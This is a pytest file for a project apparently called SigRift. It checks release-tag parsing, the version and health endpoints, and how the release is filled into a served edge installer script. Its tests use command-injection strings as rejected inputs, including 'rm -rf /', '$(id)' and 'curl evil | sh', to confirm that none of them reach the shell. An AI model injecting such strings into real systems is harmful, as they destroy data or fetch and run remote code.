"""The release the bridge image was built for (``SIGRIFT_RELEASE``).

release.yml bakes the release tag into the images, build-and-push.yml
``main-<sha12>``; anything else reports ``dev``.  ``/api/version`` and
``/api/health`` report it next to ``server_version``, which stays 4.0.0,
and the served edge installer names the release tag so the edge checks
it out (``""`` for any other build: the edge then installs main).
"""

from __future__ import annotations

import logging
import re
from pathlib import Path

import pytest
import yaml
from fastapi.testclient import TestClient

from sigrift.bridge import release_info
from sigrift.bridge.release_info import current_release, log_release, release_tag
from sigrift.bridge.routers import edge as edge_router

ROOT = Path(__file__).resolve().parents[2]
PLACEHOLDER_LINE = 'SERVER_RELEASE="__SIGRIFT_SERVER_RELEASE__"'


@pytest.mark.parametrize(
    ("value", "release", "tag"),
    [
        ("v0.1.1", "v0.1.1", "v0.1.1"),
        ("v0.1.1-rc2", "v0.1.1-rc2", "v0.1.1-rc2"),
        (" v10.20.30 ", "v10.20.30", "v10.20.30"),
        ("main-0123456789ab", "main-0123456789ab", None),
        (None, "dev", None),
        ("", "dev", None),
        ("dev", "dev", None),
        ("V0.1.1", "dev", None),
        ("v0.1", "dev", None),
        ("v0.1.1-beta", "dev", None),
        ("main-0123", "dev", None),
        ("main-0123456789AB", "dev", None),
        ('v0.1.1"; rm -rf /', "dev", None),
        ("v0.1.1\nv0.1.2", "dev", None),
        ("v" + "1" * 38 + ".0.0", "dev", None),
    ],
)
def test_release_values(
    monkeypatch: pytest.MonkeyPatch, value: str | None, release: str, tag: str | None
) -> None:
    if value is None:
        monkeypatch.delenv("SIGRIFT_RELEASE", raising=False)
    else:
        monkeypatch.setenv("SIGRIFT_RELEASE", value)
    assert current_release() == release
    assert release_tag() == tag


def test_a_rejected_release_is_logged_once_at_startup(
    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    logger = logging.getLogger("test.release")
    monkeypatch.setenv("SIGRIFT_RELEASE", "v0.1.1; id")
    with caplog.at_level(logging.INFO, logger="test.release"):
        log_release(logger)
    assert [r.getMessage() for r in caplog.records] == [
        "SIGRIFT_RELEASE='v0.1.1; id' is not a release tag or a main build: "
        "reporting release 'dev'",
        "SigRift release dev (server_version 4.0.0)",
    ]
    caplog.clear()
    monkeypatch.setenv("SIGRIFT_RELEASE", "v0.1.1")
    with caplog.at_level(logging.INFO, logger="test.release"):
        log_release(logger)
    assert [r.getMessage() for r in caplog.records] == [
        "SigRift release v0.1.1 (server_version 4.0.0)"
    ]


@pytest.mark.parametrize(
    ("value", "release"),
    [
        (None, "dev"),
        ("dev", "dev"),
        ("v0.1.1", "v0.1.1"),
        ("main-0123456789ab", "main-0123456789ab"),
    ],
    ids=["unset", "dockerfile-default", "release", "main-build"],
)
def test_an_accepted_release_logs_only_the_info_line(
    monkeypatch: pytest.MonkeyPatch,
    caplog: pytest.LogCaptureFixture,
    value: str | None,
    release: str,
) -> None:
    # "dev" is the bridge Dockerfile's ARG default: every source build has it.
    logger = logging.getLogger("test.release")
    if value is None:
        monkeypatch.delenv("SIGRIFT_RELEASE", raising=False)
    else:
        monkeypatch.setenv("SIGRIFT_RELEASE", value)
    with caplog.at_level(logging.INFO, logger="test.release"):
        log_release(logger)
    assert [(r.levelno, r.getMessage()) for r in caplog.records] == [
        (logging.INFO, f"SigRift release {release} (server_version 4.0.0)")
    ]


def test_version_reports_release_next_to_an_unchanged_server_version(
    bridge_app, monkeypatch: pytest.MonkeyPatch
) -> None:
    unauthenticated = TestClient(bridge_app)
    monkeypatch.delenv("SIGRIFT_RELEASE", raising=False)
    data = unauthenticated.get("/api/version").json()
    assert data["server_version"] == "4.0.0"
    assert data["release"] == "dev"
    keys = list(data)
    assert keys[keys.index("server_version") + 1] == "release"

    monkeypatch.setenv("SIGRIFT_RELEASE", "v0.1.1")
    data = unauthenticated.get("/api/version").json()
    assert (data["server_version"], data["release"]) == ("4.0.0", "v0.1.1")


def test_health_reports_release_and_key_persistence(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SIGRIFT_RELEASE", "v0.1.1-rc2")
    data = client.get("/api/health").json()
    assert data["version"] == "4.0.0"
    assert data["release"] == "v0.1.1-rc2"
    assert data["crypto_key_persistence"] == "disabled"


def test_the_release_regex_matches_release_yml() -> None:
    workflow = yaml.safe_load((ROOT / ".github/workflows/release.yml").read_text())
    (step,) = [s for s in workflow["jobs"]["resolve-version"]["steps"] if s.get("id") == "version"]
    (pattern,) = re.findall(r'\[\[ "\$version" =~ \^(.+?)\$ \]\]', step["run"])
    assert pattern == release_info._RELEASE_TAG_RE.pattern


def test_the_main_build_name_matches_build_and_push() -> None:
    workflow = (ROOT / ".github/workflows/build-and-push.yml").read_text()
    assert 'echo "sha_short=${GITHUB_SHA::12}"' in workflow
    assert release_info._MAIN_BUILD_RE.pattern == "main-[0-9a-f]{12}"


@pytest.mark.parametrize(
    ("value", "served"),
    [
        ("v0.1.1", 'SERVER_RELEASE="v0.1.1"'),
        ("v0.1.1-rc3", 'SERVER_RELEASE="v0.1.1-rc3"'),
        (None, 'SERVER_RELEASE=""'),
        ("main-0123456789ab", 'SERVER_RELEASE=""'),
        ('v0.1.1"; curl evil | sh; "', 'SERVER_RELEASE=""'),
        ("$(id)", 'SERVER_RELEASE=""'),
    ],
)
def test_the_served_edge_installer_names_the_release(
    bridge_app, monkeypatch: pytest.MonkeyPatch, value: str | None, served: str
) -> None:
    if value is None:
        monkeypatch.delenv("SIGRIFT_RELEASE", raising=False)
    else:
        monkeypatch.setenv("SIGRIFT_RELEASE", value)
    body = TestClient(bridge_app).get("/api/edge/install.sh").text
    lines = [line for line in body.splitlines() if line.startswith("SERVER_RELEASE=")]
    assert lines == [served]
    assert "__SIGRIFT_SERVER_RELEASE__" not in body
    # Nothing but a release tag reaches the shell.
    assert "curl evil" not in body and "$(id)" not in body


def test_the_script_on_disk_holds_the_placeholder_line_once() -> None:
    text = edge_router._INSTALL_SCRIPT_PATH.read_text(encoding="utf-8")
    assert text.count(PLACEHOLDER_LINE) == 1
    assert edge_router._RELEASE_LINE == PLACEHOLDER_LINE


def test_a_script_without_the_release_line_is_not_served(
    bridge_app, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    broken = tmp_path / "edge-install.sh"
    broken.write_text("#!/usr/bin/env bash\necho no release line\n")
    monkeypatch.setattr(edge_router, "_INSTALL_SCRIPT_PATH", broken)
    resp = TestClient(bridge_app).get("/api/edge/install.sh")
    assert resp.status_code == 500
    assert resp.json()["detail"] == "edge-install.sh has no release line to fill in"
